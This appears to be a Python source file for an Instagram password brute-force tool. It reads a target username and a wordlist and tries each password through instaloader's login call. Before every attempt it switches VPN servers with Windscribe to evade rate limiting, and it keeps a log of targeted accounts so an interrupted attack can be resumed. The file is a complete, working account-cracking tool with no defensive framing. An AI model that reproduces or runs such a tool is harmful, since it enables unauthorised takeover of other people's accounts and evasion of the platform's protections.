import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
from src.linux2 import *
def linux():
    os.system("clear")
    class bcolors:
        BOLD = '\033[1m'
        PURPLE = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[95m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        UNDERLINE = '\033[4m'
    start()
    ascii()
    codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
                "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
    L = instaloader.Instaloader()
    veri_break = "no"
    print("\nVpn starting...\n")
    time.sleep(0.5)
    os.system("clear")
    ascii()
    print(bcolors.OKGREEN+"Vpn successifully started"+bcolors.ENDC)
    time.sleep(0.5)
    os.system("clear")
    ascii()
    while True:
        if veri_break == "si":
            break
        USER = ""
        USER = input('\nUsername: @')
        wl = input("\nWord list: ")
        try:
            sleepp = int(input("\nSleep time (seconds): "))
        except ValueError:
            print(bcolors.FAIL+"ERROR 0x2: sleep time supports only number."+bcolors.ENDC)
            exit()

        while True:
            sub.call("clear")
            ascii()
            procedere = input("Username to bruteforce = "+bcolors.UNDERLINE+USER+bcolors.ENDC+"\n\nWordlist = "+bcolors.UNDERLINE+wl+bcolors.ENDC+"\n\nSleep time = "+bcolors.UNDERLINE+str(sleepp)+bcolors.ENDC+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
            if procedere == "y":
                veri_break = "si"
                break
            elif procedere == "modify":
                print("\nReturn...")
                break
            elif procedere == "break":
                exit()
            else:
                pass


    f = open('./src/log.txt', 'a')
    f.write(USER+"\n")
    f.close()

    try:
        file1 = open(wl, 'r')
        Lines = file1.readlines() 
        count = 0
    except FileNotFoundError:
        print(bcolors.FAIL+"ERROR 0x1: "+wl+" file not found, make sure it is in the directory."+bcolors.ENDC)
        exit()


    file1 = open('src/log.txt', 'r')
    Lines = file1.readlines()
    password_count = 0
    count = 0
    # Strips the newline character
    for line in Lines:
        count += 1
        if line == (USER+"\n"):
            os.system("clear")
            ascii()
            resume_input = input(bcolors.WARNING+"You have already tried to attack this account, would you like to start with the last tryed password?\n"+bcolors.ENDC+"["+bcolors.OKBLUE+"y/n"+bcolors.ENDC+"]: "+bcolors.ENDC)
            if resume_input == "y":
                os.system("clear")
                ascii()
                pass_resume = input("Choose password to start attack: ")
                password_count = 0
                file1 = open(wl, 'r')
                Lines = file1.readlines()
                l_count = 0
                for line in Lines:
                    l_count += 1
                    if line == (pass_resume+"\n"):
                        password_count = l_count


                break
            else:
                password_count = 0
                break

    file1 = open(wl, 'r')
    Lines = file1.readlines()
    count = 1
    os.system("clear")
    ascii()
    for line in Lines:
        if count < password_count:
            count = count+1
        else:            
            try:
                PASSWORD = ""
                count += 1
                pstest = ("{}".format(line.strip()))
                PASSWORD = pstest
                choiceCode = random.choice(codeList)
                time.sleep(1)
                print("\n[Changing ip address]")
                os.system("\nwindscribe connect " + choiceCode)
                print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
                L.login(USER , PASSWORD)
                print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
                break
                print("\n Turn off vpn")
                os.system("\nwindscribe disconnect ")
            except instaloader.exceptions.BadCredentialsException:
                pass
                print(bcolors.ENDC+"["+bcolors.FAIL+"incorrect password"+bcolors.ENDC+"] "+pstest+bcolors.ENDC)
                print("sleep for "+ str(sleepp))
                time.sleep(sleepp)

            except instaloader.exceptions.ConnectionException:
                print("\n"+bcolors.FAIL+"ERROR 0x4: Instagram has been requested verification via sms, try to set more login time...")
                break
                print("\n Turn off vpn")
                os.system("\nwindscribe disconnect ")
            except instaloader.exceptions.InvalidArgumentException:
                print("\n"+bcolors.FAIL+"ERROR 0x3: Username not found"+bcolors.ENDC)
                print("\n Turn off vpn")
                os.system("\nwindscribe disconnect ")


